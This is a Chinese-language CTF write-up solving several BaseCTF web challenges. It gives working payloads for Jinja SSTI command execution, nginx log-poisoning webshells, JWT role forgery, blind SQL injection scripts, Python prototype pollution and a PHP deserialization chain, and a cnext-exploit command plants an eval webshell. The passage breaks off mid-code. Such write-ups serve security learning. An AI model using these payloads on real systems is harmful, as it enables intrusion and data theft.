BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;])%} 发现Popen方法，可以用它执行命令再用read()读取即可\n构造payload\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;id\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 执行成功\n但是发现根号被ban了，这里我开始只想到${PATH:0:1},后面一位大佬研究处${HOME%%root}\n一般HOME目录都在/root下\n所以可构造payload查看flag\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cat ${HOME%%root}flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} 后面查看该系统环境变量存在一个为根号的环境变量\n构造payload\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]()[137][\u0026#39;_\u0026#39;\u0026#39;_in\u0026#39;\u0026#39;it_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_glo\u0026#39;\u0026#39;bals_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;po\u0026#39;\u0026#39;pen\u0026#39;](\u0026#39;cd $OLDPWD;cat flag\u0026#39;)[\u0026#39;rea\u0026#39;\u0026#39;d\u0026#39;]())%} [Week3] 滤个不停 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $incompetent = $_POST[\u0026#39;incompetent\u0026#39;]; $Datch = $_POST[\u0026#39;Datch\u0026#39;]; if ($incompetent !== \u0026#39;HelloWorld\u0026#39;) { die(\u0026#39;写出程序员的第一行问候吧！\u0026#39;); } //这是个什么东东？？？ $required_chars = [\u0026#39;s\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;]; $is_valid = true; foreach ($required_chars as $char) { if (strpos($Datch, $char) === false) {//意思是必须在$Datch中找到上面所有字母 $is_valid = false; break; } } if ($is_valid) { $invalid_patterns = [\u0026#39;php://\u0026#39;, \u0026#39;http://\u0026#39;, \u0026#39;https://\u0026#39;, \u0026#39;ftp://\u0026#39;, \u0026#39;file://\u0026#39; , \u0026#39;data://\u0026#39;, \u0026#39;gopher://\u0026#39;]; foreach ($invalid_patterns as $pattern) { if (stripos($Datch, $pattern) !== false) { die(\u0026#39;此路不通换条路试试?\u0026#39;); } } include($Datch); } else { die(\u0026#39;文件名不合规 请重试\u0026#39;); } ?\u0026gt; 我们要实现文件包含，但是一堆伪协议都被过滤掉了，没法绕过！\n后面查找资料发现这里可以用Nginx日志写入webshell\n日志路径为\nnginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log\n利用access.log中User-Agent写入一句话木马，然后post里面传递参数执行命令\n[Week4] No JWT 源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from flask import Flask, request, jsonify import jwt import datetime import os import random import string app = Flask(__name__) # 随机生成 secret_key app.secret_key = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) # 登录接口 @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def login(): data = request.json username = data.get(\u0026#39;username\u0026#39;) password = data.get(\u0026#39;password\u0026#39;) # 其他用户都给予 user 权限 token = jwt.encode({ \u0026#39;sub\u0026#39;: username, \u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, # 普通用户角色 \u0026#39;exp\u0026#39;: datetime.datetime.utcnow() + datetime.timedelta(hours=1) }, app.secret_key, algorithm=\u0026#39;HS256\u0026#39;) return jsonify({\u0026#39;token\u0026#39;: token}), 200 # flag 接口 @app.route(\u0026#39;/flag\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def flag(): token = request.headers.get(\u0026#39;Authorization\u0026#39;) if token: try: decoded = jwt.decode(token.split(\u0026#34; \u0026#34;)[1], options={\u0026#34;verify_signature\u0026#34;: False, \u0026#34;verify_exp\u0026#34;: False}) # 检查用户角色是否为 admin if decoded.get(\u0026#39;role\u0026#39;) == \u0026#39;admin\u0026#39;: with open(\u0026#39;/flag\u0026#39;, \u0026#39;r\u0026#39;) as f: flag_content = f.read() return jsonify({\u0026#39;flag\u0026#39;: flag_content}), 200 else: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Access denied: admin only\u0026#39;}), 403 except FileNotFoundError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Flag file not found\u0026#39;}), 404 except jwt.ExpiredSignatureError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token has expired\u0026#39;}), 401 except jwt.InvalidTokenError: return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Invalid token\u0026#39;}), 401 return jsonify({\u0026#39;message\u0026#39;: \u0026#39;Token is missing\u0026#39;}), 401 if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 发现/login和/flag两个路由，先去login路由查看一下\npost方式访问，修改为json请求并传递json数据发现一串token\n[jwt解密网站](JSON Web Tokens - jwt.io)解析一下token，flag路由检验身份必须为admin，我们修改即可\n因为源码从headers中Authorization接受数据，我们手动添加一个\n又因为如下原因\n在HTTP请求中，Authorization头部用于提供访问受保护资源所需的凭证。Bearer是认证的一种方式，它表示该请求中包含一个访问令牌（access token），这个令牌用于授权用户访问受保护的资源。\n具体来说，Authorization头部的格式为：\n1 Authorization: Bearer \u0026lt;access_token\u0026gt; 其中，Bearer关键字告诉服务器，接下来的 \u0026lt;access_token\u0026gt; 是一个令牌，用于授权请求。Bearer 认证方式是OAuth 2.0标准的一部分，用于实现无状态的访问控制，令牌通常由身份验证服务器颁发，并在请求中传递，用于验证用户身份和权限。\n总的来说，Bearer前缀的作用是明确标识令牌的类型，告诉服务器如何处理和验证这个令牌。\n所以我们构造出如下数据包即可获得flag\n[Week3] ez_php_jail 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); include(\u0026#34;hint.html\u0026#34;); $Jail = $_GET[\u0026#39;Jail_by.Happy\u0026#39;]; if($Jail == null) die(\u0026#34;Do You Like My Jail?\u0026#34;); function Like_Jail($var) { if (preg_match(\u0026#39;/(`|\\$|a|c|s|require|include)/i\u0026#39;, $var)) { return false; } return true; } if (Like_Jail($Jail)) { eval($Jail); echo \u0026#34;Yes! you escaped from the jail! LOL!\u0026#34;; } else { echo \u0026#34;You will Jail in your life!\u0026#34;; } echo \u0026#34;\\n\u0026#34;; // 在HTML解析后再输出PHP源代码 ?\u0026gt; 首先解决传参的问题，数据包中发现本题是php7，我们可以利用PHP的字符串解析特性Bypass\n当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _\n例子：?Jail[by.Happy==?Jail_by.Happy\n接着定义了一个函数Like_Jail过滤了`,$,a,c,s,require,include，并且忽略大小写。\n后面就是想办法绕过过滤打印flag，我想了下能够执行系统命令的system,shell_exec,exec都过不了过滤，只能尝试用php函数来进行读取。\n在源码中注释提示// 在HTML解析后再输出PHP源代码。找了找有这几个函数highlight_file()，highlight_string()，show_source()可以直接输出到浏览器。但是后两个过不了过滤，第一个可以\n又因为highlight_file函数需要指定准确的文件路径和flag的a被过滤，所以我们无法直接利用。先利用glob函数获取flag的文件名(没过滤的话就用scandir了！)\nglob函数返回一个包含有匹配文件或目录的数组\nprint_r打印出匹配到以fl开头的文件只有flag一个\n构造payloadhighlight_file(glob('/fl*')[0]);\n[Week3] 玩原神玩的 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); include \u0026#39;flag.php\u0026#39;; if (sizeof($_POST[\u0026#39;len\u0026#39;]) == sizeof($array)) { ys_open($_GET[\u0026#39;tip\u0026#39;]); } else { die(\u0026#34;错了！就你还想玩原神？❌❌❌\u0026#34;); } function ys_open($tip) { if ($tip != \u0026#34;我要玩原神\u0026#34;) { die(\u0026#34;我不管，我要玩原神！😭😭😭\u0026#34;); } dumpFlag(); } function dumpFlag() { if (!isset($_POST[\u0026#39;m\u0026#39;]) || sizeof($_POST[\u0026#39;m\u0026#39;]) != 2) { die(\u0026#34;可恶的QQ人！😡😡😡\u0026#34;); } $a = $_POST[\u0026#39;m\u0026#39;][0]; $b = $_POST[\u0026#39;m\u0026#39;][1]; if(empty($a) || empty($b) || $a != \u0026#34;100%\u0026#34; || $b != \u0026#34;love100%\u0026#34; . md5($a)) { die(\u0026#34;某站崩了？肯定是某忽悠干的！😡😡😡\u0026#34;); } include \u0026#39;flag.php\u0026#39;; $flag[] = array(); for ($ii = 0;$ii \u0026lt; sizeof($array);$ii++) { $flag[$ii] = md5(ord($array[$ii]) ^ $ii); } echo json_encode($flag); } 错了！就你还想玩原神？❌❌❌ 解决思路\n满足len的长度检查：我们需要提交一个len数组，使其长度与$array相同。\n正确的tip参数：在GET请求中传递tip=\u0026ldquo;我要玩原神\u0026rdquo;，以通过ys_open的检查。\n构造正确的m参数：m[0]必须为\u0026quot;100%\u0026quot;，而m[1]则为\u0026quot;love100%\u0026ldquo;加上m[0]的MD5哈希。\n先来猜出$array的元素个数吧\n用下面脚本生成字典\n1 2 3 4 5 s = \u0026#34;\u0026#34; with open(\u0026#34;./2.txt\u0026#34;, \u0026#34;w\u0026#34;) as file: for i in range(100): s = s + \u0026#34;len[\u0026#34; + str(i) + \u0026#34;]=1\u0026amp;\u0026#34; file.write(s[:-1] + \u0026#34;\\n\u0026#34;) burp爆破得出$array数组元素个数为45\npayload为len[0]=1\u0026amp;len[1]=1\u0026amp;len[2]=1\u0026amp;len[3]=1\u0026amp;len[4]=1\u0026amp;len[5]=1\u0026amp;len[6]=1\u0026amp;len[7]=1\u0026amp;len[8]=1\u0026amp;len[9]=1\u0026amp;len[10]=1\u0026amp;len[11]=1\u0026amp;len[12]=1\u0026amp;len[13]=1\u0026amp;len[14]=1\u0026amp;len[15]=1\u0026amp;len[16]=1\u0026amp;len[17]=1\u0026amp;len[18]=1\u0026amp;len[19]=1\u0026amp;len[20]=1\u0026amp;len[21]=1\u0026amp;len[22]=1\u0026amp;len[23]=1\u0026amp;len[24]=1\u0026amp;len[25]=1\u0026amp;len[26]=1\u0026amp;len[27]=1\u0026amp;len[28]=1\u0026amp;len[29]=1\u0026amp;len[30]=1\u0026amp;len[31]=1\u0026amp;len[32]=1\u0026amp;len[33]=1\u0026amp;len[34]=1\u0026amp;len[35]=1\u0026amp;len[36]=1\u0026amp;len[37]=1\u0026amp;len[38]=1\u0026amp;len[39]=1\u0026amp;len[40]=1\u0026amp;len[41]=1\u0026amp;len[42]=1\u0026amp;len[43]=1\u0026amp;len[44]=1\n绕过接下来两个\n最后这一步中因为PHP中ord函数只取一个字符串的首字母的ascii值，这个值肯定在0-255之间。我们可以通过爆破的方式来通过md5值的比较找出正确的字符\n脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $md5 = [\u0026#34;3295c76acbf4caaed33c36b1b5fc2cb1\u0026#34;,\u0026#34;26657d5ff9020d2abefe558796b99584\u0026#34;,\u0026#34;73278a4a86960eeb576a8fd4c9ec6997\u0026#34;,\u0026#34;ec8956637a99787bd197eacd77acce5e\u0026#34;,\u0026#34;e2c420d928d4bf8ce0ff2ec19b371514\u0026#34;,\u0026#34;43ec517d68b6edd3015b3edc9a11367b\u0026#34;,\u0026#34;ea5d2f1c4608232e07d3aa3d998e5135\u0026#34;,\u0026#34;c8ffe9a587b126f152ed3d89a146b445\u0026#34;,\u0026#34;66f041e16a60928b05a7e228a89c3799\u0026#34;,\u0026#34;642e92efb79421734881b53e1e1b18b6\u0026#34;,\u0026#34;a3c65c2974270fd093ee8a9bf8ae7d0b\u0026#34;,\u0026#34;9f61408e3afb633e50cdf1b20de6f466\u0026#34;,\u0026#34;72b32a1f754ba1c09b3695e0cb6cde7f\u0026#34;,\u0026#34;093f65e080a295f8076b1c5722a46aa2\u0026#34;,\u0026#34;a97da629b098b75c294dffdc3e463904\u0026#34;,\u0026#34;093f65e080a295f8076b1c5722a46aa2\u0026#34;,\u0026#34;7f39f8317fbdb1988ef4c628eba02591\u0026#34;,\u0026#34;e369853df766fa44e1ed0ff613f563bd\u0026#34;,\u0026#34;c45147dee729311ef5b5c3003946c48f\u0026#34;,\u0026#34;eb160de1de89d9058fcb0b968dbbbd68\u0026#34;,\u0026#34;a5771bce93e200c36f7cd9dfd0e5deaa\u0026#34;,\u0026#34;9f61408e3afb633e50cdf1b20de6f466\u0026#34;,\u0026#34;e369853df766fa44e1ed0ff613f563bd\u0026#34;,\u0026#34;eb160de1de89d9058fcb0b968dbbbd68\u0026#34;,\u0026#34;d645920e395fedad7bbbed0eca3fe2e0\u0026#34;,\u0026#34;a0a080f42e6f13b3a2df133f073095dd\u0026#34;,\u0026#34;b53b3a3d6ab90ce0268229151c9bde11\u0026#34;,\u0026#34;a0a080f42e6f13b3a2df133f073095dd\u0026#34;,\u0026#34;da4fb5c6e93e74d3df8527599fa62642\u0026#34;,\u0026#34;d9d4f495e875a2e075a1a4a6e1b9770f\u0026#34;,\u0026#34;d9d4f495e875a2e075a1a4a6e1b9770f\u0026#34;,\u0026#34;c0c7c76d30bd3dcaefc96f40275bdc0a\u0026#34;,\u0026#34;c74d97b01eae257e44aa9d5bade97baf\u0026#34;,\u0026#34;735b90b4568125ed6c3f678819b6e058\u0026#34;,\u0026#34;7cbbc409ec990f19c78c75bd1e06f215\u0026#34;,\u0026#34;6f4922f45568161a8cdf4ad2299f6d23\u0026#34;,\u0026#34;6ea9ab1baa0efb9e19094440c317e21b\u0026#34;,\u0026#34;e2c420d928d4bf8ce0ff2ec19b371514\u0026#34;,\u0026#34;a3f390d88e4c41f2747bfa2f1b5f87db\u0026#34;,\u0026#34;c16a5320fa475530d9583c34fd356ef5\u0026#34;,\u0026#34;c16a5320fa475530d9583c34fd356ef5\u0026#34;,\u0026#34;28dd2c7955ce926456240b2ff0100bde\u0026#34;,\u0026#34;d2ddea18f00665ce8623e36bd4e3c7c5\u0026#34;,\u0026#34;6ea9ab1baa0efb9e19094440c317e21b\u0026#34;,\u0026#34;43ec517d68b6edd3015b3edc9a11367b\u0026#34;]; $flag = \u0026#34;\u0026#34;; for ($i=0;$i\u0026lt;count($md5);$i++){ for ($j=0;$j\u0026lt;256;$j++){ $xor_result = $j ^ $i; $cal_md5 = md5($xor_result); if ($cal_md5 === $md5[$i]){ $flag .= chr($j); break; } } } echo \u0026#34;得到flag为:\u0026#34;.$flag; [Week4] only one sql 源码\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $sql = $_GET[\u0026#39;sql\u0026#39;]; if (preg_match(\u0026#39;/select|;|@|\\n/i\u0026#39;, $sql)) { die(\u0026#34;你知道的，不可能有sql注入\u0026#34;); } if (preg_match(\u0026#39;/\u0026#34;|\\$|`|\\\\\\\\/i\u0026#39;, $sql)) { die(\u0026#34;你知道的，不可能有RCE\u0026#34;); } //flag in ctf.flag $query = \u0026#34;mysql -u root -p123456 -e \\\u0026#34;use ctf;select \u0026#39;没有select，让你执行一句又如何\u0026#39;;\u0026#34; . $sql . \u0026#34;\\\u0026#34;\u0026#34;; system($query); 此题不能用select，可以通过show databases和show tables查库名和表名，后面发现题目注释里面其实写了//flag in ctf.flag,在ctf库的flag表中\n直接利用show columns查看到flag表的字段，估计就在data里面。这里不能用select，我们可以尝试delete进行盲注\n贴一下官方的wp,是真的简洁高效啊，这就是我和大佬的差距吗\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import string sqlstr = string.ascii_lowercase + string.digits + \u0026#39;-\u0026#39; + \u0026#34;{}\u0026#34; url = \u0026#34;http://your.website/?sql=delete%20from%20flag%20where%20data%20like%20%27\u0026#34; end=\u0026#34;%25%27%20and%20sleep(5)\u0026#34; flag=\u0026#39;\u0026#39; for i in range(1, 100): for c in sqlstr: payload = url +flag+ c + end try: r = requests.get(payload,timeout=4) except: print(flag+c) flag+=c break 经过查表和对flag格式的了解，flag的内容就在小写字母，数字和这几个符号之间，生成一个列表进行枚举\n我的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import requests import time list = [\u0026#39;-\u0026#39;] for i in range(97,127): #小写字母和符号 list.append(chr(i)) for i in range(48,58): #数字 list.append(chr(i)) # print(list) #delete from flag where data like \u0026#39;f%\u0026#39; and sleep(3)-- url = \u0026#34;http://challenge.basectf.fun:27082/?sql=delete from flag where data like \u0026#39;\u0026#34; end = \u0026#34;%\u0026#39; and sleep(3)--\u0026#34; flag = \u0026#34;\u0026#34; for x in range(100): for j in list: start_time = time.time() payload = url + flag + j + end res = requests.get(payload) use_time = time.time() - start_time if use_time \u0026gt;= 3: flag += j print(flag) [Fin] 1z_php 这道题考察原生类(读取文件类SplFileObject)和PCRE回溯\n脚本\n1 2 3 4 import requests payload = \u0026#34;http://challenge.basectf.fun:28522/?e[m.p=114514.1\u0026amp;a=SplFileObject\u0026amp;b=php://filter/read=convert.base64-encode/resource=flag.php\u0026amp;c=__toString\u0026#34; res = requests.post(payload,data={\u0026#34;try\u0026#34;:\u0026#34;a\u0026#34;*1000001 + \u0026#34;HACKER\u0026#34;}) print(res.text) [Fin] Back to the future 此题纯粹靠一款工具，我仔细看了一下，比我之前用的githack强太多了！\n提取仓库文件 githacker --url http://challenge.basectf.fun:42682/.git/ --output-folder C:\\Users\\xxx\\Desktop\\result\n查看提交日志 git log\n切换到含flag的提交 git checkout 9d85f10e0192ef630e10d7f876a117db41c30417\n恢复出来\n[Fin] Jinja Mark flag路径下看到提示爆破出幸运数字为5346\n可用以下脚本生成字典\n1 2 3 4 with open(r\u0026#39;c:\\Users\\天\\Desktop\\3.txt\u0026#39;,\u0026#39;w\u0026#39;) as f: for i in range(10000): f.write(f\u0026#34;{i:04}\u0026#34;+\u0026#34;\\n\u0026#34;) print(\u0026#34;successful~\u0026#34;) 拿到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 BLACKLIST_IN_index = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;] def merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) @app.route(\u0026#39;/magic\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def pollute(): if request.method == \u0026#39;POST\u0026#39;: if request.is_json: merge(json.loads(request.data), instance) return \u0026#34;这个魔术还行吧\u0026#34; else: return \u0026#34;我要json的魔术\u0026#34; return \u0026#34;记得用POST方法把魔术交上来\u0026#34; 代码里面有merge函数，基本存在python原型链污染了，结合开头ban了左右花括号，我们可以尝试利用原型链污染来修改jinja2模版的属性，直接将变量取值方式改为\u0026laquo;\u0026raquo;从而绕过花括号的过滤\n将以下json数据传入经json.loads后成功修改\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;__init__\u0026#34;: { \u0026#34;__globals__\u0026#34;: { \u0026#34;app\u0026#34;: { \u0026#34;jinja_env\u0026#34;: { \u0026#34;variable_start_string\u0026#34;: \u0026#34;\u0026lt;\u0026lt;\u0026#34;, \u0026#34;variable_end_string\u0026#34;: \u0026#34;\u0026gt;\u0026gt;\u0026#34; } } } } } 回到index目录下进行常规ssti即可\n这里我尝试了几个模块，其实方法都差不多，不过subprocess.Popen这个类本身就能够执行命令\nwarnings.catch_warnings 1 \u0026lt;\u0026lt;\u0026#39;\u0026#39;.__class__.__mro__[1].__subclasses__()[222].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;)\u0026gt;\u0026gt; subprocess.Popen 1 \u0026lt;\u0026lt;[].__class__.__mro__[1].__subclasses__()[351](\u0026#39;cat /flag\u0026#39;,shell=True,stdout=-1).communicate()[0].strip()\u0026gt;\u0026gt; os._wrap_close 1 \u0026lt;\u0026lt;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;id\u0026#39;).read()\u0026gt;\u0026gt; [Fin] Just Readme (前置) 使用这个项目打glibc的iconv()函数将文件读取变成rce\n将data后改为.text,不然无法正常输出\npayloadpython3 cnext-exploit.py http://challenge.basectf.fun:34357/ \u0026quot;echo '\u0026lt;?=@eval(\\$_POST[0]);?\u0026gt;' \u0026gt; shell.php\u0026quot;\n蚁剑连接执行文件即可\n[Fin] Lucky Number 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from flask import Flask,request,render_template_string,render_template from jinja2 import Template import json import heaven def merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() BLACKLIST_IN_index = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;] def is_json(data): try: json.loads(data) return True except ValueError: return False @app.route(\u0026#39;/m4G1c\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def pollute(): if request.method == \u0026#39;POST\u0026#39;: if request.is_json: merge(json.loads(request.data), instance) result = heaven.create() message = result[\u0026#34;message\u0026#34;] return \u0026#34;这个魔术还行吧 \u0026#34; + message else: return \u0026#34;我要json的魔术\u0026#34; return \u0026#34;记得用POST方法把魔术交上来\u0026#34; #heaven.py def create(kon=\u0026#34;Kon\u0026#34;, pure=\u0026#34;Pure\u0026#34;, *, confirm=False): if confirm and \u0026#34;lucky_number\u0026#34; not in create.__kwdefaults__: return {\u0026#34;message\u0026#34;: \u0026#34;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？\u0026#34;, \u0026#34;lucky_number\u0026#34;: \u0026#34;nope\u0026#34;} if confirm and \u0026#34;lucky_number\u0026#34; in create.__kwdefaults__: return {\u0026#34;message\u0026#34;: \u0026#34;这是你的lucky_number，请拿好，去/check下检查一下吧\u0026#34;, \u0026#34;lucky_number\u0026#34;: create.__kwdefaults__[\u0026#34;lucky_number\u0026#34;]} return {\u0026#34;message\u0026#34;: \u0026#34;你有什么想创造的吗？\u0026#34;, \u0026#34;lucky_number\u0026#34;: \u0026#34;nope\u0026#34;} 解题重点是这两个属性\n怎么导入sys模块呢，看了官方wp才知道在python中存在着**spec内置属性，包含了关于类加载时的信息，定义在Lib/importlib/_bootstrap.py的类ModuleSpec，所以可以直接采用\u0026lt;模块名\u0026gt;.spec.init.globals[\u0026lsquo;sys\u0026rsquo;]**获取到sys模块，此处导入了json模块就可以使用json模块获取\npayload,拿去json格式化一下即可\n1 {\u0026#34;__init__\u0026#34;:{\u0026#34;__globals__\u0026#34;:{\u0026#34;json\u0026#34;:{\u0026#34;__sepc__\u0026#34;:{\u0026#34;__init__\u0026#34;:{\u0026#34;__globals__\u0026#34;:{\u0026#34;sys\u0026#34;:{\u0026#34;modules\u0026#34;:{\u0026#34;heaven\u0026#34;:{\u0026#34;create\u0026#34;:{\u0026#34;__kwdefaults__\u0026#34;:{\u0026#34;confirm\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;lucky_number\u0026#34;:\u0026#34;5346\u0026#34;}}}}}}}}}}}} 传参后提示去/check检查一下\n检查成功了，去对应目录ssti\n这里利用os._wrap_close中的popen方法直接执行命令即可，模块方法有很多\n[Fin] ez_php 这道题出现了很多新知识，比如引用绕过，php GC回收攻击，mb_substr,mb_strpos字符串逃逸，理解清楚后算是收益颇丰，参考文章：\n()[ctfshow_XGCTF_西瓜杯 | 晨曦的个人小站 (chenxi9981.github.io)]\n()[(ฅ\u0026gt;ω\u0026lt;*ฅ) 噫又好啦 ~php反序列化 | 晨曦的个人小站 (chenxi9981.github.io)]\n源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 \u0026lt;?php highlight_file(__file__); function substrstr($data) { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } class Hacker{ public $start; public $end; public $username=\u0026#34;hacker\u0026#34;; public function __construct($start){ $this-\u0026gt;start=$start; } public function __wakeup(){ $this-\u0026gt;username=\u0026#34;hacker\u0026#34;; $this-\u0026gt;end = $this-\u0026gt;start; } public function __destruct(){ if(!preg_match(\u0026#39;/ctfer/i\u0026#39;,$this-\u0026gt;username)){ echo \u0026#39;Hacker！\u0026#39;; } } } class C{ public $c; public function __toString(){ $this-\u0026gt;c-\u0026gt;c(); return \u0026#34;C\u0026#34;; } } class T{ public $t; public function __call($name,$args){ echo $this-\u0026gt;t-\u0026gt;t; } } class F{ public $f; public function __get($name){ return isset($this-\u0026gt;f-\u0026gt;f); } } class E{ public $e; public function __isset($name){ ($this-\u0026gt;e)(); } } class R{ public $r; public function __invoke(){ eval($this-\u0026gt;r); } } if(isset($_GET[\u0026#39;ez_ser.from_you\u0026#39;])){ $ctf = new Hacker(\u0026#39;{{{\u0026#39;.$_GET[\u0026#39;ez_ser.from_you\u0026#39;].\u0026#39;}}}\u0026#39;); if(preg_match(\u0026#34;/\\[|\\]/i\u0026#34;, $_GET[\u0026#39;substr\u0026#39;])){ die(\u0026#34;NONONO!!!\u0026#34;); } $pre = isset($_GET[\u0026#39;substr\u0026#39;])?$_GET[\u0026#39;substr\u0026#39;]:\u0026#34;substr\u0026#34;; $ser_ctf = substrstr($pre.\u0026#34;[\u0026#34;.serialize($ctf).\u0026#34;]\u0026#34;); $a = unserialize($ser_ctf); throw new Exception(\u0026#34;杂鱼~杂鱼~\u0026#34;); } 首先便是构造pop利用链，这道题的是比较好构造的，有个以前不知道的知识点是__get方法中 如果你没有为 t 属性赋值，或者将其设置为 null，那么在调用 $this-\u0026gt;t-\u0026gt;t 时将会抛出一个错误，因为你尝试在一个 null 值上访问属性\n以前只知道访问不可访问属性和未定义成员变量可以触发，其实没赋值定义访问属性也能触发\n到Hacker类前这么构造即可\n1 2 3 4 5 6 7 8 9 10 $s1 = new R(); $s1-\u0026gt;r = \u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;; $s2 = new 